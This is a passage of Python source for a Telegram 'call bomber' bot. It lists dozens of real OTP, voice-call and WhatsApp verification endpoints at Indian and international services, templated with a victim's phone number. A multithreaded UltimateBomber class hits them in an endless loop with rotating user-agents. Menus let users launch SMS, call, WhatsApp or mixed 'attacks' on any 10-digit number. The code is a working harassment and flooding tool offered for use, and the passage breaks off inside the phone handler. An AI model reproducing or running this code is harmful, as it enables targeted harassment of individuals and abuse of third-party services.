    {"name": "CodFirm", "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "Coolwinks", "url": lambda phone: f"https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "Zee5 OTP", "url": lambda phone: f"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "PhonePe OTP", "url": "https://aa-interface.phonepe.com/.../otp/trigger", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "Depop Verification", "url": "https://api.depop.com/.../verification/phone-number/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Doubtnut v4 (check)", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "Khatabook v1", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Moglix sendOTP", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'},
    {"name": "Liquide Life", "url": "https://api.v2.liquide.life/api/auth/checkNumber/+91", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "TradeIndia", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Eka Care", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json", "Client-Id": "androidp"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
    {"name": "Entri (check)", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Housing.com GraphQL", "url": "https://mightyzeus.housing.com/api/gql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"query":"mutation {{ sendOTP(phone: \\"{phone}\\") }}"}}'},
    {"name": "NewMe Asia (prod)", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'},
    {"name": "PokerBaazi OAuth", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'},
    {"name": "AgriRevolution", "url": "https://oidc.agrevolution.in/.../custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'},
    {"name": "Apna (prod)", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"name": "Unacademy (check)", "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","send_otp":true}}'},
    {"name": "1MG (auth)", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Jockey (resend)", "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "RummyCircle (sendOtp)", "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'},
    {"name": "Samsung OTP", "url": "https://www.samsung.com/in/api/v1/sso/otp/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "Shoppers Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Doubtnut (micro call)", "url": "https://micro.doubtnut.com/otp/send-call", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "CallBomberZ (api)", "url": lambda phone: f"https://callbomberz.online/api.php?mobile={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "CallBomberZ (apii)", "url": lambda phone: f"https://callbomberz.online/apii.php?number={phone}", "method": "GET", "headers": {}, "data": None},
]

CALL_APIS_BASE = [
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Myntra Voice Call", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Paytm Voice Call", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Zomato Voice Call", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=voice"},
    {"name": "Ola Voice Call", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Uber Voice Call", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Kotak Voice Call", "url": "https://www.kotak.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Amazon Voice Call", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=voice_otp"},
    {"name": "CallBomberZ (api)", "url": lambda phone: f"https://callbomberz.online/api.php?mobile={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "CallBomberZ (apii)", "url": lambda phone: f"https://callbomberz.online/apii.php?number={phone}", "method": "GET", "headers": {}, "data": None},
]

WHATSAPP_APIS_BASE = [
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"name": "KPN WhatsApp v2", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "content-type": "application/json"}, "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNo":"{phone}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp (dup)", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json", "Client-Id": "androidp"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
    {"name": "KPN WhatsApp v3", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "content-type": "application/json"}, "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}},"notification_channel":"WHATSAPP"}}'},
]

SMS_APIS      = generate_apis(SMS_APIS_BASE, 5)
CALL_APIS     = generate_apis(CALL_APIS_BASE, 5)
WHATSAPP_APIS = generate_apis(WHATSAPP_APIS_BASE, 5)
MIX_APIS      = SMS_APIS + CALL_APIS + WHATSAPP_APIS

# ============================================================
# ULTIMATE BOMBER
# ============================================================
class UltimateBomber:
    def __init__(self, phone, api_list, stop_event=None):
        self.phone = phone
        self.api_list = api_list
        self.stop_event = stop_event if stop_event else threading.Event()
        self.success = 0
        self.failed = 0
        self.total = 0
        self.is_running = False
        self.lock = threading.Lock()
        self.session_pool = []
        self.session_lock = threading.Lock()
        self.MAX_SESSIONS = 100
        import multiprocessing
        self.max_workers = min(len(api_list), multiprocessing.cpu_count() * 50, 500)

    def get_session(self):
        with self.session_lock:
            if self.session_pool:
                return self.session_pool.pop()
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
                ])
            })
            return session

    def return_session(self, session):
        with self.session_lock:
            if len(self.session_pool) < self.MAX_SESSIONS:
                self.session_pool.append(session)
            else:
                try: session.close()
                except Exception: pass

    def hit_api(self, api):
        if self.stop_event.is_set(): return False
        try:
            url = api.get('url')
            if callable(url): url = url(self.phone)
            if not url: return False
            data = None
            if api.get('data'):
                try: data = api['data'](self.phone) if callable(api['data']) else api['data']
                except Exception: data = None
            headers = api.get('headers', {}).copy()
            method = api.get('method', 'POST').upper()
            session = self.get_session()
            timeout = random.uniform(1.0, 3.0)
            try:
                if method == 'GET':
                    response = session.get(url, headers=headers, timeout=timeout)
                else:
                    if data and 'json' in headers.get('Content-Type', ''):
                        try:
                            json_data = json.loads(data)
                            response = session.post(url, json=json_data, headers=headers, timeout=timeout)
                        except Exception:
                            response = session.post(url, data=data, headers=headers, timeout=timeout)
                    else:
                        response = session.post(url, data=data, headers=headers, timeout=timeout)
                self.return_session(session)
                return response.status_code in [200, 201, 202, 204, 302, 303, 304, 400]
            except Exception:
                self.return_session(session)
                return False
        except Exception: return False

    def run(self):
        self.is_running = True
        while not self.stop_event.is_set():
            shuffled = self.api_list.copy()
            random.shuffle(shuffled)
            chunk_size = max(1, len(shuffled) // self.max_workers)
            chunks = [shuffled[i:i + chunk_size] for i in range(0, len(shuffled), chunk_size)]
            with ThreadPoolExecutor(max_workers=len(chunks)) as executor:
                futures = [executor.submit(self.process_chunk, c) for c in chunks]
                for f in as_completed(futures):
                    if self.stop_event.is_set(): break
                    try:
                        s, fl = f.result()
                        with self.lock:
                            self.success += s
                            self.failed += fl
                            self.total += s + fl
                    except Exception: pass
            if self.total > 100000:
                with self.lock:
                    self.cleanup()
                    self.total = 0
                    self.success = 0
                    self.failed = 0
        self.is_running = False
        return {'total_requests': self.total, 'success': self.success, 'failed': self.failed}

    def process_chunk(self, chunk):
        s = f = 0
        for api in chunk:
            if self.stop_event.is_set(): break
            if self.hit_api(api): s += 1
            else: f += 1
        return s, f

    def cleanup(self):
        with self.session_lock:
            for sess in self.session_pool:
                try: sess.close()
                except Exception: pass
            self.session_pool = []
        gc.collect()

# ============================================================
# UI
# ============================================================
active_bombers = {}

def welcome_text(user, frame="⚡"):
    username = f"@{user.username}" if user.username else "No Username"
    chat_id = user.id
    return f"""{frame} ━━━━━━━━━━━━━━━━━━━ {frame}
🌐 <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 ~
SR GAMER PRO CALL BOMBER BOT</b> ⚡️
{frame} ━━━━━━━━━━━━━━━━━━━ {frame}

╭───────────────➤
💠 <b>𝐌𝐘 𝐍𝐀𝐌𝐄 :</b> TIRU
🐿️👑 <b>𝐎𝐖𝐍𝐄𝐑 :</b> TIRU GAMER OWNER
🛰️ <b>𝐒𝐓𝐀𝐓𝐔𝐒 :</b> 🟢 ONLINE
╰───────────────➤
❤️‍🩹 <b>!~ WELCOME ❤️‍🩹</b>
🎮 <b>𝐍𝐄𝐖 𝐌𝐄𝐌𝐁𝐄𝐑 𝐈𝐍𝐅𝐎 ⤵️</b>
🔴 <b>Name :</b> TIRU GAMER OWNER
🟠 <b>Username :</b> {username}
🟡 <b>Chat ID :</b> <code>{chat_id}</code>
🟢 <b>Rank :</b> 👑 OWNER TIER
🎮 <b>𝐈𝐅 𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐀𝐍𝐘 𝐏𝐑𝐎𝐁𝐋𝐄𝐌</b>
💬 <b>𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐀𝐃𝐌𝐈𝐍 :-)</b> {ADMIN_HANDLE}
"""

def unlock_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🔓 𝐔𝐍𝐋𝐎𝐂𝐊 𝐁𝐎𝐓", callback_data="unlock"))
    kb.add(types.InlineKeyboardButton("💬 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐀𝐃𝐌𝐈𝐍", url=f"https://t.me/{ADMIN_USERNAME}"))
    return kb

def join_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("📢 𝐉𝐎𝐈𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url=CHANNEL_1_LINK))
    kb.add(types.InlineKeyboardButton("✅ 𝐈 𝐉𝐎𝐈𝐍𝐄𝐃", callback_data="check_join"))
    return kb

def main_menu():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📱 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁",  callback_data="start_sms"),
        types.InlineKeyboardButton("📞 𝐂𝐀𝐋𝐋 𝐁𝐎𝐌𝐁", callback_data="start_call"),
        types.InlineKeyboardButton("💬 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏",  callback_data="start_whatsapp"),
        types.InlineKeyboardButton("🔥 𝐌𝐈𝐗 𝐁𝐎𝐌𝐁",  callback_data="start_mix"),
        types.InlineKeyboardButton("⏹️ 𝐒𝐓𝐎𝐏",       callback_data="stop_bomb"),
        types.InlineKeyboardButton("📊 𝐒𝐓𝐀𝐓𝐒",      callback_data="stats"),
        types.InlineKeyboardButton("🕒 𝐒𝐓𝐀𝐓𝐔𝐒",     callback_data="status"),
        types.InlineKeyboardButton("👑 𝐀𝐃𝐌𝐈𝐍",      url=f"https://t.me/{ADMIN_USERNAME}")
    )
    return kb

def admin_panel():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📊 Stats",         callback_data="a_stats"),
        types.InlineKeyboardButton("👥 Users",         callback_data="a_users"),
        types.InlineKeyboardButton("➕ Add Admin",     callback_data="a_addadmin"),
        types.InlineKeyboardButton("➖ Remove Admin",  callback_data="a_deladmin"),
        types.InlineKeyboardButton("📢 Add Channel",   callback_data="a_addchannel"),
        types.InlineKeyboardButton("🚫 Remove Channel",callback_data="a_delchannel"),
        types.InlineKeyboardButton("🚫 Block User",    callback_data="a_block"),
        types.InlineKeyboardButton("♻️ Unblock User",  callback_data="a_unblock"),
        types.InlineKeyboardButton("🛡️ Protect Number",callback_data="a_protect"),
        types.InlineKeyboardButton("🔓 Unprotect",     callback_data="a_unprotect"),
        types.InlineKeyboardButton("📣 Broadcast",     callback_data="a_broadcast"),
        types.InlineKeyboardButton("⚙️ Settings",      callback_data="a_settings"),
        types.InlineKeyboardButton("⏹️ STOP BOMB",     callback_data="stop_bomb"),
        types.InlineKeyboardButton("🔙 Main Menu",     callback_data="home"),
    )
    return kb

def is_member(user_id, channel):
    try:
        member = bot.get_chat_member(channel, user_id)
        return member.status in ["creator", "administrator", "member"]
    except Exception:
        return False

def _animate_welcome(chat_id, message_id, user, cycles=8, delay=0.7):
    """Cycles welcome banner frame — visible animation."""
    try:
        for i in range(cycles):
            frame = BANNER_FRAMES[i % len(BANNER_FRAMES)]
            try:
                bot.edit_message_text(welcome_text(user, frame=frame), chat_id, message_id, parse_mode="HTML")
            except Exception:
                pass
            time.sleep(delay)
        try:
            bot.edit_message_text(welcome_text(user, frame="⚡"), chat_id, message_id, parse_mode="HTML")
        except Exception:
            pass
    except Exception:
        pass

# ============================================================
# COMMANDS
# ============================================================
@bot.message_handler(commands=["start"])
def start_cmd(msg):
    try:
        upsert_user(msg.from_user)
        if is_blocked(msg.from_user.id):
            bot.send_message(msg.chat.id, "🚫 <b>You are blocked.</b>")
            return

        sent = bot.send_message(msg.chat.id, welcome_text(msg.from_user, frame="⚡"), parse_mode="HTML")
        threading.Thread(
            target=_animate_welcome,
            args=(msg.chat.id, sent.message_id, msg.from_user, 8, 0.7),
            daemon=True
        ).start()

        if is_force_join_verified(msg.from_user.id) and is_unlocked(msg.from_user.id):
            bot.send_message(
                msg.chat.id,
                "🔥 <b>SR GAMER OWNER CALL BOMBER BOT</b> 🔥\n\n✅ <b>Unlocked!</b>",
                reply_markup=main_menu()
            )
        elif is_force_join_verified(msg.from_user.id):
            set_unlocked(msg.from_user.id, True)
            bot.send_message(
                msg.chat.id,
                "🔥 <b>SR GAMER OWNER CALL BOMBER BOT</b> 🔥\n\n✅ <b>Unlocked!</b>",
                reply_markup=main_menu()
            )
        else:
            bot.send_message(msg.chat.id, "👇 Click below to start the unlock process.", reply_markup=unlock_keyboard())
    except Exception as e:
        print(f"Start error: {e}")

@bot.message_handler(commands=["admin"])
def admin_cmd(msg):
    try:
        if not is_admin(msg.from_user.id):
            bot.send_message(msg.chat.id, "⛔ <b>Unauthorized.</b>")
            return
        bot.send_message(msg.chat.id, "🛠 <b>Admin Panel</b>", reply_markup=admin_panel())
    except Exception as e:
        print(f"Admin cmd error: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "unlock")
def unlock_cb(call):
    try:
        text = f"""
🔐 <b>𝐁𝐎𝐓 𝐔𝐍𝐋𝐎𝐂𝐊 𝐒𝐘𝐒𝐓𝐄𝐌</b>
━━━━━━━━━━━━━━━━━━━━
🚀 Bot use karne ke liye pehle
neeche diye gaye <b>CHANNEL</b> join karo.
📢 <b>{CHANNEL_1_LINK}</b> → Join
✅ <b>I JOINED</b> dabao
━━━━━━━━━━━━━━━━━━━━
⚠️ <b>Important:</b> Channel join karna required hai.
"""
        bot.answer_callback_query(call.id)
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=join_keyboard())
    except Exception: pass

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_cb(call):
    try:
        user_id = call.from_user.id
        joined = is_member(user_id, CHANNEL_1)
        if joined:
            set_force_join_verified(user_id, True)
            set_unlocked(user_id, True)
            bot.answer_callback_query(call.id, "✅ Verified! Bot unlocked.", show_alert=True)
            bot.edit_message_text("🎉 <b>𝐁𝐎𝐓 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃!</b> 🎉\n\n✅ Channel joined!\n✅ Bot ready!", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
        else:
            bot.answer_callback_query(call.id, "❌ Pehle channel join karo!", show_alert=True)
            bot.edit_message_text(f"❌ <b>VERIFICATION FAILED</b>\n\nAbhi bhi channel join nahi hua:\n📢 {CHANNEL_1_LINK}\n\n👉 Pehle channel join karo, phir dobara ✅ I JOINED dabao.", call.message.chat.id, call.message.message_id, reply_markup=join_keyboard())
    except Exception: pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("start_"))
def mode_select(call):
    try:
        user_id = call.from_user.id
        mode = call.data.replace("start_", "")
        if not is_unlocked(user_id):
            bot.answer_callback_query(call.id, "🔒 Bot locked! Use /start", show_alert=True)
            return
        user_states[user_id] = {'mode': mode}
        emoji_map = {"sms": "📱", "call": "📞", "whatsapp": "💬", "mix": "🔥"}
        bot.send_message(call.message.chat.id, f"{emoji_map.get(mode, '📱')} <b>Enter 10-digit phone number:</b>\nExample: <code>8081463281</code>")
        bot.answer_callback_query(call.id)
    except Exception: pass

@bot.callback_query_handler(func=lambda call: call.data == "stop_bomb")
def stop_bomb_cb(call):
    try:
        user_id = call.from_user.id
        if user_id in active_bombers:
            bombers = active_bombers[user_id]
            stopped = 0
            for bomber in bombers:
                if bomber.is_running:
                    bomber.stop_event.set()
                    stopped += 1
            if stopped:
                bot.send_message(call.message.chat.id, f"⏹️ <b>Stopping {stopped} attack(s)...</b>")
                bot.answer_callback_query(call.id, f"✅ Stopped {stopped} attack(s)!")
            else:
                bot.send_message(call.message.chat.id, "⚠️ No active attack.")
                bot.answer_callback_query(call.id)
        else:
            bot.send_message(call.message.chat.id, "⚠️ No active attack.")
            bot.answer_callback_query(call.id)
    except Exception: pass

@bot.callback_query_handler(func=lambda call: call.data == "stats")
def stats_cb(call):
    try:
        bot.send_message(
            call.message.chat.id,
            f"📊 <b>ULTIMATE Stats</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📱 SMS:      <code>{len(SMS_APIS)}</code>\n"
            f"📞 Call:     <code>{len(CALL_APIS)}</code>\n"
            f"💬 WhatsApp: <code>{len(WHATSAPP_APIS)}</code>\n"
            f"🔥 Mix:      <code>{len(MIX_APIS)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>UNLIMITED SPEED!</b>"
        )
        bot.answer_callback_query(call.id)
    except Exception: pass

@bot.callback_query_handler(func=lambda call: call.data == "status")
def status_cb(call):
    try:
        user_id = call.from_user.id
        state = "🟢 ✅ UNLOCKED" if is_unlocked(user_id) else "🔴 🔒 LOCKED"
        running = user_id in active_bombers and any(b.is_running for b in active_bombers[user_id])
        attack = "🟢 Running" if running else "⚪ Idle"
        bot.send_message(call.message.chat.id, f"📌 <b>Status:</b> {state}\n<b>Attack:</b> {attack}")
        bot.answer_callback_query(call.id)
    except Exception: pass

@bot.callback_query_handler(func=lambda call: call.data == "home")
def home_cb(call):
    try:
        bot.edit_message_text("🏠 <b>Main Menu</b>", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
        bot.answer_callback_query(call.id)
    except Exception: pass

@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
def admin_panel_cb(call):
    try:
        if not is_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "⛔ Unauthorized!", show_alert=True)
            return
        bot.edit_message_text("🛠 <b>Admin Panel</b>", call.message.chat.id, call.message.message_id, reply_markup=admin_panel())
        bot.answer_callback_query(call.id)
    except Exception: pass

@bot.callback_query_handler(func=lambda call: call.data.startswith(("a_", "deladmin:", "delch:", "unprotect_num:")))
def admin_actions(call):
    try:
        if not is_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "⛔ Unauthorized!", show_alert=True)
            return
        data = call.data
        if data == "a_stats":
            users = len(get_all_users()); unlocked = get_approved_users_count()
            blocked = get_blocked_users_count(); protected = len(get_protected_numbers())
            bot.send_message(call.message.chat.id, f"📊 <b>Stats</b>\n🔴 Users: <code>{users}</code>\n🟢 Unlocked: <code>{unlocked}</code>\n🚫 Blocked: <code>{blocked}</code>\n🛡️ Protected: <code>{protected}</code>")
        elif data == "a_users":
            users = get_all_users()
            text = f"👥 <b>Users:</b> <code>{len(users)}</code>\n"
            for u in users[:20]:
                text += f"<code>{u[0]}</code> - {'✅' if u[2] else '❌'} {'🚫' if u[3] else '✅'}\n"
            bot.send_message(call.message.chat.id, text)
        elif data == "a_addadmin":
            bot.send_message(call.message.chat.id, "➕ <b>Send user ID to add as admin.</b>")
            bot.register_next_step_handler(call.message, add_admin_process)
        elif data == "a_deladmin":
            kb = types.InlineKeyboardMarkup()
            for a in admins():
                if a != MASTER_ADMIN_ID:
                    kb.add(types.InlineKeyboardButton(f"❌ Remove {a}", callback_data=f"deladmin:{a}"))
            bot.send_message(call.message.chat.id, "Select admin:", reply_markup=kb)
        elif data.startswith("deladmin:"):
            aid = int(data.split(":")[1]); remove_admin(aid)
            bot.send_message(call.message.chat.id, f"✅ Admin <code>{aid}</code> removed.")
        elif data == "a_broadcast":
            bot.send_message(call.message.chat.id, "📣 <b>Send broadcast message.</b>")
            bot.register_next_step_handler(call.message, broadcast_process)
        elif data == "a_protect":
            bot.send_message(call.message.chat.id, "🛡️ <b>Send number to protect (10 digits).</b>")
            bot.register_next_step_handler(call.message, protect_process)
        elif data == "a_unprotect":
            protected = get_protected_numbers()
            if not protected:
                bot.send_message(call.message.chat.id, "No protected numbers."); return
            kb = types.InlineKeyboardMarkup()
            for num in protected:
                kb.add(types.InlineKeyboardButton(f"🔓 {num}", callback_data=f"unprotect_num:{num}"))
            bot.send_message(call.message.chat.id, "Select number to unprotect:", reply_markup=kb)
        elif data.startswith("unprotect_num:"):
            number = data.split(":")[1]; unprotect_number(number)
            bot.send_message(call.message.chat.id, f"🔓 <code>{number}</code> unprotected.")
        elif data == "a_block":
            bot.send_message(call.message.chat.id, "🚫 <b>Send user ID to block.</b>")
            bot.register_next_step_handler(call.message, block_process)
        elif data == "a_unblock":
            bot.send_message(call.message.chat.id, "♻️ <b>Send user ID to unblock.</b>")
            bot.register_next_step_handler(call.message, unblock_process)
        elif data == "a_addchannel":
            bot.send_message(call.message.chat.id, "📢 <b>Send channel username (e.g., @channel).</b>")
            bot.register_next_step_handler(call.message, add_channel_process)
        elif data == "a_delchannel":
            chs = channels()
            if not chs:
                bot.send_message(call.message.chat.id, "No channels."); return
            kb = types.InlineKeyboardMarkup()
            for ch in chs:
                kb.add(types.InlineKeyboardButton(f"❌ Remove {ch}", callback_data=f"delch:{ch}"))
            bot.send_message(call.message.chat.id, "Select channel:", reply_markup=kb)
        elif data.startswith("delch:"):
            ch = data.split(":")[1]; remove_channel(ch)
            bot.send_message(call.message.chat.id, f"✅ <code>{ch}</code> removed.")
        elif data == "a_settings":
            bot.send_message(call.message.chat.id, f"⚙️ <b>Settings</b>\nAdmins: <code>{len(admins())}</code>\nChannels: <code>{len(channels())}</code>\nProtected: <code>{len(get_protected_numbers())}</code>")
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Admin action error: {e}")

# ---------- Phone Handler ----------
@bot.message_handler(func=lambda m: m.text and re.match(r'^\d{10}$', m.text))
def handle_phone(msg):
    try:
        user_id = msg.from_user.id
        phone = msg.text.strip()
        if not is_unlocked(user_id):
            bot.send_message(msg.chat.id, "🔒 <b>Bot locked!</b> Use /start"); return
        if is_protected(phone):
            bot.send_message(msg.chat.id, "🛡️ <b>This number is protected by admin!</b>"); return
        if user_id not in user_states:
            bot.send_message(msg.chat.id, "❌ <b>Please select a mode first from main menu!</b>"); return
        mode = user_states[user_id].get('mode', 'mix')
        api_map = {'sms': SMS_APIS, 'call': CALL_APIS, 'whatsapp': WHATSAPP_APIS, 'mix': MIX_APIS}
        api_list = api_map.get(mode, MIX_APIS)
